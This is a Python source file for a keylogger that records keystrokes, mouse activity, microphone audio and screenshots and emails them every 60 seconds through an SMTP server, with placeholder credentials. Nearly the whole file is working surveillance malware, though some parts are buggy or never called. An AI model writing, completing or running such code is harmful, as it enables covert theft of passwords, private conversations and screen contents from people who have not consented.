import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

EMAIL_ADDRESS = "email@email"
EMAIL_PASSWORD = "email"
SEND_REPORT_EVERY = 60  # in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + '\n' + string

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}"
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_click = f"Mouse clicked at {x}, {y} with {button}"
            self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y} by {dx} horizontally and {dy} vertically"
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    def send_mail(self, email, password, message, attachment=None):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email  # sending to the same email for demonstration
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(message, 'plain'))

        if attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= %s" % os.path.basename(attachment.name))
            msg.attach(part)

        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())

    def report(self):
        print("Sending report...")
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def microphone(self):
        print("Recording audio...")
        fs = 44100
        seconds = SEND_REPORT_EVERY
        with wave.open('sound.wav', 'wb') as obj:
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

        with open('sound.wav', 'rb') as f:
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="Audio Recording", attachment=f)

    def screenshot(self):
        print("Taking screenshot...")
        img_path = "screenshot.png"
        pyscreenshot.grab().save(img_path)
        with open(img_path, 'rb') as f:
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="Screenshot", attachment=f)

    def run(self):
        print("Keylogger started...")
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

print("Initializing keylogger...")
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()